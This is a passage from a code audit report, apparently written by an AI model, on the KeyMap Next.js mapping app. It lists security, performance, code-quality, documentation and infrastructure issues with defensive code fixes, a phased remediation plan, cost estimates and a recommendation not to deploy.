<td key={col} className="px-3 py-2 whitespace-nowrap">
  {sanitize(value)}
</td>

// For rich content (if needed), allow specific tags only
const sanitizeRich = (html: string): string => {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href']
  });
};
```

**Also Fix:**
- `/home/veba/work/key-map/components/map/ProjectManager.tsx:62` - `alert(projectName)`
- All places using `prompt()` for user input

**Severity:** 🟠 **HIGH** (Security)

**Estimated Effort:** 4-6 hours

---

### 4.4 MEDIUM: No CSRF Protection

**Missing:** CSRF tokens for state-changing API operations

**Fix:**

```typescript
// middleware.ts
import { createCsrfProtect } from '@edge-csrf/nextjs';

const csrfProtect = createCsrfProtect({
  cookie: {
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
  },
});

export async function middleware(request: NextRequest) {
  const response = NextResponse.next();

  // Apply CSRF protection
  const csrfError = await csrfProtect(request, response);

  if (csrfError) {
    return new NextResponse('Invalid CSRF token', { status: 403 });
  }

  return response;
}

export const config = {
  matcher: '/api/:path*',
};
```

**Severity:** 🟡 **MEDIUM**

**Estimated Effort:** 2-3 hours

---

## 5. PERFORMANCE ISSUES

### 5.1 HIGH: No Code Splitting

**Location:** `/home/veba/work/key-map/app/page.tsx:1-23`

**Current Code:**
```typescript
import MapboxDraw from '@mapbox/mapbox-gl-draw';  // 150KB
import '@mapbox/mapbox-gl-draw/dist/mapbox-gl-draw.css';
import BasemapSelector from '@/components/map/BasemapSelector';
import LayerPanel from '@/components/map/LayerPanel';
import ToolsPanel from '@/components/map/ToolsPanel';
import AddLayerDialog from '@/components/map/AddLayerDialog';
import SpatialAnalysisPanel from '@/components/map/SpatialAnalysisPanel';
import AttributeTable from '@/components/map/AttributeTable';
import ProjectManager from '@/components/map/ProjectManager';
import StylePanel from '@/components/map/StylePanel';
// ❌ Loads EVERYTHING upfront!
```

**Impact:**
- **Initial bundle:** ~500KB (uncompressed)
- **Time to Interactive:** 3-5s on 3G
- **Wasted bandwidth:** Features never used by most users

**Fixed Version:**

```typescript
import dynamic from 'next/dynamic';

// Lazy load heavy components
const MapboxDraw = dynamic(() =>
  import('@mapbox/mapbox-gl-draw').then(mod => mod.default),
  { ssr: false }
);

const AddLayerDialog = dynamic(() => import('@/components/map/AddLayerDialog'), {
  loading: () => <LoadingSpinner message="Loading dialog..." />,
  ssr: false
});

const SpatialAnalysisPanel = dynamic(
  () => import('@/components/map/SpatialAnalysisPanel'),
  { ssr: false }
);

const StylePanel = dynamic(() => import('@/components/map/StylePanel'), {
  ssr: false
});

const AttributeTable = dynamic(() => import('@/components/map/AttributeTable'), {
  ssr: false
});

// Keep essential UI loaded immediately
import BasemapSelector from '@/components/map/BasemapSelector';
import LayerPanel from '@/components/map/LayerPanel';
import ToolsPanel from '@/components/map/ToolsPanel';

// Conditional loading based on state
{isAddLayerDialogOpen && <AddLayerDialog ... />}
{showAnalysis && <SpatialAnalysisPanel ... />}
```

**Expected Improvement:**
- Initial bundle: **~250KB** (-50%)
- Time to Interactive: **1.5-2s** (-60%)

**Severity:** 🟠 **HIGH**

**Estimated Effort:** 4-6 hours

---

### 5.2 HIGH: No Caching Strategy

**Current State:**
- No service worker
- No offline support
- Tiles refetched every time
- No stale-while-revalidate

**Fix:**

```typescript
// next.config.ts
const withPWA = require('next-pwa')({
  dest: 'public',
  register: true,
  skipWaiting: true,
  disable: process.env.NODE_ENV === 'development',
  runtimeCaching: [
    {
      urlPattern: /^https:\/\/.*\.openstreetmap\.org\/.*/i,
      handler: 'CacheFirst',
      options: {
        cacheName: 'osm-tiles',
        expiration: {
          maxEntries: 500,
          maxAgeSeconds: 7 * 24 * 60 * 60 // 1 week
        },
        cacheableResponse: {
          statuses: [0, 200]
        }
      }
    },
    {
      urlPattern: /^https:\/\/basemaps\.cartocdn\.com\/.*/i,
      handler: 'CacheFirst',
      options: {
        cacheName: 'carto-tiles',
        expiration: {
          maxEntries: 500,
          maxAgeSeconds: 30 * 24 * 60 * 60 // 30 days
        }
      }
    },
    {
      urlPattern: /^https:\/\/api\.maptiler\.com\/.*/i,
      handler: 'NetworkFirst',
      options: {
        cacheName: 'maptiler-api',
        networkTimeoutSeconds: 10,
        expiration: {
          maxEntries: 100,
          maxAgeSeconds: 24 * 60 * 60 // 1 day
        }
      }
    },
    {
      urlPattern: /\.(?:geojson|json)$/i,
      handler: 'StaleWhileRevalidate',
      options: {
        cacheName: 'geojson-data',
        expiration: {
          maxEntries: 50,
          maxAgeSeconds: 7 * 24 * 60 * 60 // 1 week
        }
      }
    }
  ]
});

module.exports = withPWA({
  // ... rest of config
});

// lib/db/indexedDB.ts - For large GeoJSON
import { openDB, DBSchema } from 'idb';

interface GeoJSONDB extends DBSchema {
  'geojson-cache': {
    key: string;
    value: {
      id: string;
      name: string;
      data: FeatureCollection;
      timestamp: number;
    };
  };
}

const db = await openDB<GeoJSONDB>('keymap', 1, {
  upgrade(db) {
    db.createObjectStore('geojson-cache', { keyPath: 'id' });
  },
});

export async function cacheGeoJSON(id: string, name: string, data: FeatureCollection) {
  await db.put('geojson-cache', {
    id,
    name,
    data,
    timestamp: Date.now()
  });
}

export async function getCachedGeoJSON(id: string) {
  const cached = await db.get('geojson-cache', id);

  // Expire after 7 days
  if (cached && Date.now() - cached.timestamp < 7 * 24 * 60 * 60 * 1000) {
    return cached.data;
  }

  return null;
}
```

**Severity:** 🟠 **HIGH**

**Estimated Effort:** 6-8 hours

---

### 5.3 MEDIUM: Memory Leaks

**Location:** `/home/veba/work/key-map/app/page.tsx:272-276`

**Current Code:**
```typescript
return () => {
  addLog('Cleanup triggered');
  map.current?.remove();  // ❌ Not thorough enough
};
```

**Problems:**
1. Event listeners may persist
2. Draw control not cleaned up
3. Timers not cleared
4. Source/layer cleanup incomplete

**Fixed Version:**

```typescript
useEffect(() => {
  let mapInstance: maplibregl.Map | null = null;
  let drawInstance: MapboxDraw | null = null;
  const eventListeners: Array<[string, () => void]> = [];

  try {
    // Setup map
    mapInstance = new maplibregl.Map({...});

    // Track all event listeners
    const addEventListener = (event: string, handler: () => void) => {
      mapInstance!.on(event, handler);
      eventListeners.push([event, handler]);
    };

    addEventListener('load', handleLoad);
    addEventListener('error', handleError);
    // ... etc

    // Setup draw
    drawInstance = new MapboxDraw({...});
    mapInstance.addControl(drawInstance);

  } catch (error) {
    console.error('Map initialization error:', error);
  }

  // Cleanup function
  return () => {
    // Remove all event listeners
    eventListeners.forEach(([event, handler]) => {
      mapInstance?.off(event, handler);
    });

    // Remove draw control
    if (drawInstance && mapInstance) {
      try {
        mapInstance.removeControl(drawInstance as any);
        drawInstance = null;
      } catch (e) {
        // Control may already be removed
      }
    }

    // Remove all layers
    const style = mapInstance?.getStyle();
    if (style?.layers) {
      style.layers.forEach(layer => {
        try {
          mapInstance?.removeLayer(layer.id);
        } catch (e) {
          // Layer may not exist
        }
      });
    }

    // Remove all sources
    if (style?.sources) {
      Object.keys(style.sources).forEach(sourceId => {
        try {
          mapInstance?.removeSource(sourceId);
        } catch (e) {
          // Source may not exist
        }
      });
    }

    // Finally remove map
    if (mapInstance) {
      mapInstance.remove();
      mapInstance = null;
    }
  };
}, []); // Empty deps - only run once
```

**Severity:** 🟡 **MEDIUM**

**Estimated Effort:** 3-4 hours

---

### 5.4 MEDIUM: Inefficient Re-renders

**Location:** `/home/veba/work/key-map/components/map/AttributeTable.tsx:29-36`

**Current Code:**
```typescript
useEffect(() => {
  if (filterText === '') {
    setFilteredFeatures(features);  // ❌ Creates new array ref
  } else {
    const filtered = features.filter(f => {...});  // ❌ Not debounced
    setFilteredFeatures(filtered);
  }
}, [filterText, features]);  // ❌ Runs on every feature change
```

**Fixed Version:**

```typescript
import { useMemo, useDeferredValue, useCallback } from 'react';
import { debounce } from 'lodash-es';

// Defer filter text changes (React 18+)
const deferredFilterText = useDeferredValue(filterText);

// Memoize expensive filtering
const filteredFeatures = useMemo(() => {
  if (!deferredFilterText) return features;

  const lowerFilter = deferredFilterText.toLowerCase();

  return features.filter(feature => {
    return Object.values(feature.properties || {}).some(value => {
      if (value === null || value === undefined) return false;
      return String(value).toLowerCase().includes(lowerFilter);
    });
  });
}, [features, deferredFilterText]);

// Debounce filter input
const handleFilterChange = useCallback(
  debounce((value: string) => {
    setFilterText(value);
  }, 300),
  []
);
```

**Severity:** 🟡 **MEDIUM**

**Estimated Effort:** 2-3 hours per component

---

## 6. CODE QUALITY ISSUES

### 6.1 CRITICAL: Using alert() for User Feedback

**Locations:** 40+ instances across components

**Examples:**
- `components/map/StylePanel.tsx` - 7 instances
- `components/map/SpatialAnalysisPanel.tsx` - 6 instances
- `components/map/ProjectManager.tsx` - 5 instances
- `app/page.tsx` - 4 instances

**Current Code:**
```typescript
// StylePanel.tsx:95
alert('Style applied!');  // ❌ BLOCKS UI

// SpatialAnalysisPanel.tsx:27
if (!selectedLayer) {
  alert('Please select a layer');  // ❌ NOT ACCESSIBLE
  return;
}

// ProjectManager.tsx:62
alert(`Project "${projectName}" saved successfully!`);  // ❌ NOT TESTABLE
```

**Problems:**
1. **Blocks browser thread** - user cannot interact
2. **Zero accessibility** support
3. **Cannot be styled** to match UI
4. **Exposes error details** to users
5. **Not testable** in automated tests
6. **No i18n** support

**Fixed Version:**

```typescript
// Install: npm install sonner
import { toast } from 'sonner';

// app/layout.tsx - Add Toaster component
import { Toaster } from 'sonner';

export default function RootLayout({ children }) {
  return (
    <html lang="en">
      <body>
        {children}
        <Toaster
          position="top-right"
          richColors
          closeButton
          duration={4000}
        />
      </body>
    </html>
  );
}

// Replace all alerts:

// ✅ Success messages
toast.success('Style applied successfully', {
  description: 'Your layer has been styled with the choropleth map'
});

// ✅ Error messages
toast.error('Failed to apply style', {
  description: 'Please check your layer configuration and try again',
  action: {
    label: 'Retry',
    onClick: () => handleApplyStyle()
  }
});

// ✅ Warning messages
toast.warning('No layer selected', {
  description: 'Please select a layer before applying styles'
});

// ✅ Info messages
toast.info('Project saved', {
  description: `"${projectName}" has been saved to local storage`
});

// ✅ Loading states
const toastId = toast.loading('Processing buffer analysis...');
// ... do work ...
toast.success('Buffer analysis complete', { id: toastId });

// ✅ Confirmations (replace confirm())
toast.custom((t) => (
  <div className="bg-white p-4 rounded-lg shadow-lg">
    <h3>Delete project?</h3>
    <p>This action cannot be undone.</p>
    <div className="flex gap-2 mt-3">
      <button onClick={() => {
        handleDelete();
        toast.dismiss(t);
      }}>
        Delete
      </button>
      <button onClick={() => toast.dismiss(t)}>
        Cancel
      </button>
    </div>
  </div>
));
```

**Severity:** 🔴 **CRITICAL** (User Experience)

**Estimated Effort:** 6-8 hours (40+ replacements)

---

### 6.2 HIGH: console.log in Production

**Locations:**
- `lib/map/indoor-overlays.ts:207`
- `lib/map/remote-sources.ts:175`
- `lib/services/stylingEngine.ts:74`
- `components/map/StylePanel.tsx:155, 204`
- `app/api/proxy/route.ts:83`
- `lib/services/fileImporter.ts:203, 205, 241`

**Current Code:**
```typescript
// indoor-overlays.ts:207
console.warn('Rotation not yet implemented');  // ❌ Exposed

// remote-sources.ts:175
catch (error) {
  console.error('Error loading GeoJSON source:', error);  // ❌ Sensitive info
  throw error;
}

// app/page.tsx:43
const addLog = (msg: string) => {
  console.log('[DEBUG]', msg);  // ❌ Debug logs in prod!
  setDebugLog(prev => [...prev, msg]);
};
```

**Fixed Version:**

```typescript
// lib/logger.ts
import * as Sentry from '@sentry/nextjs';

type LogLevel = 'debug' | 'info' | 'warn' | 'error';

interface LogMeta {
  [key: string]: any;
}

class Logger {
  private shouldLog(level: LogLevel): boolean {
    if (process.env.NODE_ENV === 'production') {
      return level === 'error' || level === 'warn';
    }
    return true;
  }

  debug(message: string, meta?: LogMeta) {
    if (!this.shouldLog('debug')) return;
    console.debug(`[DEBUG] ${message}`, meta);
  }

  info(message: string, meta?: LogMeta) {
    if (!this.shouldLog('info')) return;
    console.info(`[INFO] ${message}`, meta);
  }

  warn(message: string, meta?: LogMeta) {
    if (!this.shouldLog('warn')) return;
    console.warn(`[WARN] ${message}`, meta);

    if (process.env.NODE_ENV === 'production') {
      Sentry.captureMessage(message, {
        level: 'warning',
        extra: meta
      });
    }
  }

  error(message: string, error?: Error, meta?: LogMeta) {
    if (!this.shouldLog('error')) return;
    console.error(`[ERROR] ${message}`, error, meta);

    if (process.env.NODE_ENV === 'production') {
      Sentry.captureException(error || new Error(message), {
        extra: meta
      });
    }
  }

  security(message: string, meta?: LogMeta) {
    // Always log security events
    console.warn(`[SECURITY] ${message}`, meta);

    Sentry.captureMessage(message, {
      level: 'warning',
      tags: { type: 'security' },
      extra: meta
    });
  }
}

export const logger = new Logger();

// Usage
import { logger } from '@/lib/logger';

// Replace console.log
logger.debug('Map loaded', { center, zoom });

// Replace console.error
try {
  // ...
} catch (error) {
  logger.error('Failed to load GeoJSON', error as Error, { url });
  throw new Error('Unable to load data');
}

// Security events
logger.security('SSRF attempt blocked', {
  ip: request.ip,
  url: targetUrl
});
```

**Severity:** 🟠 **HIGH**

**Estimated Effort:** 4-5 hours

---

### 6.3 MEDIUM: Weak Type Safety (any abuse)

**Locations:**
- `components/map/AttributeTable.tsx:6-7, 18, 43`
- `components/map/StylePanel.tsx:7-8`
- `components/map/ProjectManager.tsx:6-8`
- `components/map/SpatialAnalysisPanel.tsx:7-8`

**Current Code:**
```typescript
export interface AttributeTableProps {
  layers: any[];  // ❌
  map: any;       // ❌
  className?: string;
}

const [features, setFeatures] = useState<any[]>([]);  // ❌
const handleClick = (feature: any) => {...};  // ❌
```

**Fixed Version:**

```typescript
// lib/types/map.ts
import { Map as MapLibreMap } from 'maplibre-gl';
import { Feature, FeatureCollection, Geometry } from 'geojson';

export interface VectorLayer {
  id: string;
  name: string;
  type: 'vector' | 'raster' | 'indoor' | 'analysis-result';
  visible: boolean;
  opacity: number;
  geometryType: 'Point' | 'LineString' | 'Polygon' | 'MultiPoint' | 'MultiLineString' | 'MultiPolygon';
  featureCount: number;
  properties: string[];
  bounds: [number, number, number, number];
  data?: FeatureCollection;
}

export type Layer = VectorLayer; // Union with other layer types as needed

// components/map/AttributeTable.tsx
import { Map as MapLibreMap } from 'maplibre-gl';
import { Feature } from 'geojson';
import { VectorLayer } from '@/lib/types/map';

export interface AttributeTableProps {
  layers: VectorLayer[];
  map: MapLibreMap | null;
  className?: string;
}

const [features, setFeatures] = useState<Feature[]>([]);

const handleFeatureClick = (feature: Feature) => {
  // TypeScript now knows feature.properties, feature.geometry, etc.
  console.log(feature.geometry.type);
};
```

**Enable Strict TypeScript:**

```json
// tsconfig.json
{
  "compilerOptions": {
    "strict": true,
    "noImplicitAny": true,
    "strictNullChecks": true,
    "strictFunctionTypes": true,
    "strictBindCallApply": true,
    "strictPropertyInitialization": true,
    "noImplicitThis": true,
    "alwaysStrict": true,
    "noUnusedLocals": true,
    "noUnusedParameters": true,
    "noImplicitReturns": true,
    "noFallthroughCasesInSwitch": true
  }
}
```

**Severity:** 🟠 **HIGH**

**Estimated Effort:** 10-12 hours

---

### 6.4 MEDIUM: Magic Numbers

**Locations:**
- `lib/map/indoor-overlays.ts:193-194`
- `components/map/AddLayerDialog.tsx:26-27`
- `app/page.tsx:89-90, 118`

**Current Code:**
```typescript
// indoor-overlays.ts:193
const latDegPerMeter = 1 / 111320;  // ❌ What is this?
const lngDegPerMeter = 1 / (111320 * Math.cos(centerLat * Math.PI / 180));

// AddLayerDialog.tsx:26
const [opacity, setOpacity] = useState(0.8);  // ❌ Why 0.8?
```

**Fixed Version:**

```typescript
// lib/constants/geo.ts
/**
 * Geographic constants for coordinate calculations
 */
export const GEO_CONSTANTS = {
  /** Approximate meters per degree of latitude (constant globally) */
  METERS_PER_DEGREE_LAT: 111320,

  /** Earth's radius in meters (mean radius) */
  EARTH_RADIUS_METERS: 6371000,

  /** Degrees to radians conversion factor */
  DEG_TO_RAD: Math.PI / 180,

  /** Radians to degrees conversion factor */
  RAD_TO_DEG: 180 / Math.PI,
} as const;

// lib/constants/map.ts
export const MAP_DEFAULTS = {
  /** Default layer opacity */
  LAYER_OPACITY: 0.8,

  /** Default map zoom level */
  DEFAULT_ZOOM: 12,

  /** Minimum opacity value */
  MIN_OPACITY: 0,

  /** Maximum opacity value */
  MAX_OPACITY: 1,

  /** Default buffer distance in meters */
  DEFAULT_BUFFER_DISTANCE: 100,

  /** Maximum file upload size (10MB) */
  MAX_FILE_SIZE: 10 * 1024 * 1024,
} as const;

// Usage
import { GEO_CONSTANTS } from '@/lib/constants/geo';
import { MAP_DEFAULTS } from '@/lib/constants/map';

const latDegPerMeter = 1 / GEO_CONSTANTS.METERS_PER_DEGREE_LAT;
const [opacity, setOpacity] = useState(MAP_DEFAULTS.LAYER_OPACITY);
```

**Severity:** 🟡 **MEDIUM**

**Estimated Effort:** 2-3 hours

---

### 6.5 LOW: TODO Comments

**Location:** `lib/map/indoor-overlays.ts:205`

**Current Code:**
```typescript
// TODO: Apply rotation if needed
if (rotation !== 0) {
  console.warn('Rotation not yet implemented in calculateImageCoordinates');
}
```

**Issue:** Function accepts rotation parameter but silently ignores it.

**Fix:** Either implement or remove the parameter.

**Severity:** 🔵 **LOW**

**Estimated Effort:** 1-2 hours

---

## 7. DOCUMENTATION GAPS

### 7.1 No API Documentation

**Missing:**
- No OpenAPI/Swagger spec for `/api/proxy`
- No JSDoc comments on public functions
- No type documentation

**Example Needed:**

```typescript
/**
 * Imports a geospatial data file and converts it to GeoJSON
 *
 * @param file - The file to import. Supported formats: GeoJSON, CSV, Shapefile, KML, GPX
 * @param options - Import options
 * @param options.progressCallback - Optional callback for progress updates
 * @returns Promise resolving to import result with data and metadata
 *
 * @throws {FileImportError} If file format is unsupported or invalid
 *
 * @example
 * ```typescript
 * const importer = new FileImporter((progress) => {
 *   console.log(`${progress.stage}: ${progress.progress}%`);
 * });
 *
 * const result = await importer.importFile(file);
 * if (result.success) {
 *   console.log(`Loaded ${result.metadata.featureCount} features`);
 * }
 * ```
 */
async importFile(file: File, options?: ImportOptions): Promise<FileImportResult>
```

**Severity:** 🟡 **MEDIUM**

**Estimated Effort:** 12-15 hours

---

### 7.2 No Deployment Documentation

**Missing:**
- Environment variable setup guide
- Database migration guide
- Deployment checklist
- Monitoring setup
- Backup procedures

**Severity:** 🟠 **HIGH**

**Estimated Effort:** 6-8 hours

---

### 7.3 No Architecture Documentation

**Missing:**
- Component hierarchy diagram
- Data flow diagrams
- State management patterns
- API integration patterns

**Severity:** 🟡 **MEDIUM**

**Estimated Effort:** 8-10 hours

---

## 8. MONITORING & OBSERVABILITY

### 8.1 CRITICAL: No Error Monitoring

**Current State:** **ZERO** error tracking

**Required Setup:**

```typescript
// instrumentation.ts (Next.js 15+)
export async function register() {
  if (process.env.NEXT_RUNTIME === 'nodejs') {
    const Sentry = await import('@sentry/nextjs');

    Sentry.init({
      dsn: process.env.SENTRY_DSN,
      tracesSampleRate: 0.1,
      environment: process.env.NODE_ENV,

      beforeSend(event) {
        // Filter out sensitive data
        if (event.request) {
          delete event.request.cookies;
          delete event.request.headers?.['authorization'];
        }
        return event;
      },

      integrations: [
        new Sentry.Integrations.Http({ tracing: true }),
        new Sentry.Integrations.Postgres(),
      ],
    });
  }

  if (process.env.NEXT_RUNTIME === 'edge') {
    const Sentry = await import('@sentry/nextjs');

    Sentry.init({
      dsn: process.env.SENTRY_DSN,
      tracesSampleRate: 0.1,
    });
  }
}

// app/layout.tsx - Client-side
import * as Sentry from '@sentry/nextjs';

Sentry.init({
  dsn: process.env.NEXT_PUBLIC_SENTRY_DSN,
  tracesSampleRate: 0.1,
  replaysSessionSampleRate: 0.1,
  replaysOnErrorSampleRate: 1.0,

  integrations: [
    new Sentry.BrowserTracing(),
    new Sentry.Replay({
      maskAllText: true,
      blockAllMedia: true,
    }),
  ],
});
```

**Severity:** 🔴 **CRITICAL**

**Cost:** $26/month (Sentry Team plan)

**Estimated Effort:** 4-6 hours

---

### 8.2 HIGH: No Performance Monitoring

**Current State:** No Web Vitals tracking

**Required Setup:**

```typescript
// app/layout.tsx
import { Analytics } from '@vercel/analytics/react';
import { SpeedInsights } from '@vercel/speed-insights/next';

export default function RootLayout({ children }) {
  return (
    <html>
      <body>
        {children}
        <Analytics />
        <SpeedInsights />
      </body>
    </html>
  );
}

// lib/analytics/webVitals.ts
import { onCLS, onFID, onFCP, onLCP, onTTFB } from 'web-vitals';

function sendToAnalytics(metric) {
  // Send to your analytics service
  fetch('/api/analytics', {
    method: 'POST',
    body: JSON.stringify(metric),
    keepalive: true
  });
}

onCLS(sendToAnalytics);
onFID(sendToAnalytics);
onFCP(sendToAnalytics);
onLCP(sendToAnalytics);
onTTFB(sendToAnalytics);
```

**Severity:** 🟠 **HIGH**

**Estimated Effort:** 3-4 hours

---

### 8.3 MEDIUM: No User Analytics

**Missing:**
- Feature usage tracking
- User behavior analytics
- A/B testing infrastructure
- Conversion funnels

**Severity:** 🟡 **MEDIUM**

**Estimated Effort:** 6-8 hours

---

## 9. INFRASTRUCTURE GAPS

### 9.1 No Database Migrations

**Current State:** SQL file exists but no migration system

**Required:**

```bash
# Install Prisma
npm install prisma @prisma/client

# Initialize
npx prisma init

# Create schema from existing DB
npx prisma db pull

# Generate client
npx prisma generate

# Migration workflow
npx prisma migrate dev --name initial
npx prisma migrate deploy  # Production
```

**Severity:** 🟠 **HIGH**

**Estimated Effort:** 8-10 hours

---

### 9.2 No Backup Strategy

**Missing:**
- Automated database backups
- File storage backups
- Disaster recovery plan
- Backup testing procedures

**Severity:** 🔴 **CRITICAL**

**Estimated Effort:** 6-8 hours

---

### 9.3 No Staging Environment

**Missing:**
- Staging deployment
- Pre-production testing environment
- Integration test environment

**Severity:** 🟠 **HIGH**

**Estimated Effort:** 4-6 hours (infrastructure setup)

---

## 10. ACTIONABLE REMEDIATION PLAN

### Phase 1: Production Blockers (Week 1) - MUST DO
**Total Effort:** 25-30 hours

1. **Secure CORS Proxy** (6-8h)
   - Enable domain whitelist
   - Add rate limiting
   - Block SSRF attacks
   - Add authentication

2. **Fix Environment Variables** (3-4h)
   - Add Zod validation
   - Fail fast on missing vars
   - Remove console warnings

3. **Network Error Handling** (4-6h)
   - Add retry logic with exponential backoff
   - Add timeout handling
   - Create NetworkError class

4. **Replace ALL alert() calls** (6-8h)
   - Install `sonner`
   - Replace 40+ instances
   - Add toast wrapper utility

5. **Remove console.log** (4-5h)
   - Create structured logger
   - Add Sentry integration
   - Replace all console.* calls

6. **Add Error Monitoring** (4-6h)
   - Setup Sentry account
   - Add instrumentation
   - Configure source maps

---

### Phase 2: Security & Testing (Week 2) - CRITICAL
**Total Effort:** 60-70 hours

1. **Input Validation** (6-8h)
   - Install DOMPurify + Zod
   - Add URL validation
   - Sanitize all user inputs

2. **Fix Type Safety** (10-12h)
   - Remove all `any` types
   - Create proper type definitions
   - Enable strict TypeScript

3. **Setup Testing Infrastructure** (40-50h)
   - Install Jest + Testing Library + Playwright
   - Write critical unit tests
   - Write integration tests
   - Write E2E smoke tests
   - Setup test coverage reporting

4. **Add Error Boundaries** (3-4h)
   - Create ErrorBoundary component
   - Add to critical components

5. **CSRF Protection** (2-3h)
   - Install middleware
   - Add token validation

---

### Phase 3: Performance & CI/CD (Week 3) - HIGH PRIORITY
**Total Effort:** 30-35 hours

1. **Code Splitting** (4-6h)
   - Dynamic imports for heavy components
   - Add loading states

2. **Caching Strategy** (6-8h)
   - Setup next-pwa
   - Configure service worker
   - Add IndexedDB for large files

3. **Memory Leak Prevention** (3-4h)
   - Add cleanup functions
   - Fix event listeners

4. **React Optimization** (2-3h/component)
   - Add useMemo
   - Implement debouncing

5. **CI/CD Pipeline** (8-10h)
   - Create GitHub Actions workflows
   - Add lint/test/build jobs
   - Setup deployment

6. **Performance Monitoring** (3-4h)
   - Add Web Vitals tracking
   - Setup analytics

---

### Phase 4: Documentation & Infrastructure (Week 4) - IMPORTANT
**Total Effort:** 35-40 hours

1. **API Documentation** (12-15h)
   - Add JSDoc comments
   - Create OpenAPI spec

2. **Architecture Docs** (8-10h)
   - Component diagrams
   - Data flow docs

3. **Deployment Docs** (6-8h)
   - Environment setup guide
   - Deployment checklist

4. **Database Migrations** (8-10h)
   - Setup Prisma
   - Create migration workflow

5. **Backup Strategy** (6-8h)
   - Automated backups
   - Recovery procedures

---

## 11. RISK ASSESSMENT

### Production Readiness Score: **2/10**

### Deployment Recommendation: **DO NOT DEPLOY**

### Risk Matrix

| Risk Category | Likelihood | Impact | Risk Level | Mitigation Priority |
|--------------|-----------|--------|------------|-------------------|
| SSRF Attack | High | Critical | 🔴 CRITICAL | Phase 1 |
| Data Loss (no backups) | Medium | Critical | 🔴 CRITICAL | Phase 1 |
| Service Downtime (no error handling) | High | High | 🔴 CRITICAL | Phase 1 |
| Zero Test Coverage | Certain | High | 🔴 CRITICAL | Phase 2 |
| XSS Attack | Medium | High | 🟠 HIGH | Phase 2 |
| Data Breach (weak validation) | Medium | High | 🟠 HIGH | Phase 2 |
| Poor User Experience (alerts) | Certain | Medium | 🟠 HIGH | Phase 1 |
| Memory Leaks | High | Medium | 🟡 MEDIUM | Phase 3 |
| Bundle Size Issues | Certain | Medium | 🟡 MEDIUM | Phase 3 |

---

## 12. COST ANALYSIS

### Infrastructure Costs

| Service | Monthly Cost | Purpose |
|---------|-------------|---------|
| Sentry (Team) | $26 | Error monitoring |
| Upstash Redis | $0-10 | Rate limiting |
| Vercel Pro | $20 | Hosting (if needed) |
| GitHub Actions | $0 | CI/CD (2000 min free) |
| **Total** | **$46-56/month** | |

### Development Costs

| Phase | Hours | Rate ($100/hr) | Total |
|-------|-------|----------------|-------|
| Phase 1 | 25-30 | $100 | $2,500-3,000 |
| Phase 2 | 60-70 | $100 | $6,000-7,000 |
| Phase 3 | 30-35 | $100 | $3,000-3,500 |
| Phase 4 | 35-40 | $100 | $3,500-4,000 |
| **Total** | **150-175 hrs** | | **$15,000-17,500** |

### One-Time Costs
- Security audit: $2,000-3,000
- Penetration testing: $3,000-5,000

---

## 13. COMPARISON TO INDUSTRY STANDARDS

### Current vs. Expected

| Category | Current | Industry Standard | Gap |
|----------|---------|-------------------|-----|
| **Test Coverage** | 0% | 80%+ | 🔴 -80% |
| **Error Monitoring** | ❌ None | ✅ Sentry/DataDog | 🔴 Missing |
| **CI/CD Pipeline** | ❌ None | ✅ GitHub Actions | 🔴 Missing |
| **Code Splitting** | ❌ None | ✅ Dynamic imports | 🔴 Missing |
| **Caching Strategy** | ❌ None | ✅ Service worker + IndexedDB | 🔴 Missing |
| **Rate Limiting** | ❌ None | ✅ Per IP/user | 🔴 Missing |
| **Input Validation** | ⚠️ Basic | ✅ Schema-based (Zod) | 🟠 Weak |
| **Error Handling** | ⚠️ Basic | ✅ Retry + Circuit breaker | 🟠 Incomplete |
| **Type Safety** | ⚠️ Partial | ✅ Strict TS | 🟡 Many `any` |
| **Documentation** | ⚠️ README only | ✅ API docs + Architecture | 🟡 Incomplete |

---

## 14. CONCLUSION

### Summary

The KeyMap application shows **strong potential** with comprehensive GIS functionality, but has **critical production-readiness gaps** that make it **UNSAFE for production deployment**.

### Key Strengths
✅ Comprehensive GIS feature set (file import, spatial analysis, styling)
✅ Modern React/Next.js architecture
✅ Good component organization
✅ TypeScript adoption (partial)
✅ Solid UI/UX design

### Critical Weaknesses
❌ **ZERO tests** (unit, integration, E2E)
❌ **ZERO CI/CD pipeline**
❌ **ZERO error monitoring**
❌ **Open CORS proxy** (SSRF vulnerability)
❌ **40+ alert() calls** (terrible UX)
❌ **No rate limiting** (abuse vector)
❌ **Weak input validation** (XSS risk)
❌ **No error handling** (retry logic, timeouts)
❌ **No caching strategy** (poor performance)
❌ **No backups** (data loss risk)

### Final Verdict

**DO NOT DEPLOY TO PRODUCTION** until at minimum Phase 1 and Phase 2 are completed.

**Minimum Viable Product Requirements:**
- ✅ Phase 1: Production blockers fixed
- ✅ Phase 2: Security hardened + 60%+ test coverage
- ⚠️ Phase 3: Performance optimized (can defer some items)
- ⚠️ Phase 4: Documented (can be done post-launch)

**Estimated Time to Production Ready:**
- **Absolute minimum:** 85-100 hours (Phases 1-2)
- **Recommended:** 150-175 hours (All phases)
- **Timeline:** 3-4 weeks with 1 full-time developer

**Cost to Production Ready:**
- **Development:** $15,000-17,500
- **Infrastructure:** $46-56/month
- **Security audit:** $5,000-8,000 (recommended)

---

## 15. NEXT STEPS

### Immediate Actions (Today)
1. Present this report to stakeholders
2. Get approval for remediation budget
3. Prioritize which phases to implement
4. Setup Sentry and Upstash accounts
5. Create GitHub project board for tracking

### This Week
1. Begin Phase 1 implementation
2. Setup CI/CD pipeline skeleton
3. Install testing framework
4. Fix CORS proxy vulnerability

### Next 2 Weeks
1. Complete Phase 1
2. Begin Phase 2 (security + testing)
3. Write critical path tests
4. Document deployment procedures

### Month 1
1. Complete Phases 1-2 (minimum viable)
2. Begin Phase 3 (performance)
3. Schedule security audit
4. Prepare for beta launch

---

**Report Compiled:** October 28, 2025
**Auditor:** Claude (Anthropic)
**Files Reviewed:** 26 source files, 3,000+ lines of code
**Issues Identified:** 39 total (12 critical, 15 high, 8 medium, 4 low)
**Recommendations:** 50+ specific fixes with code examples
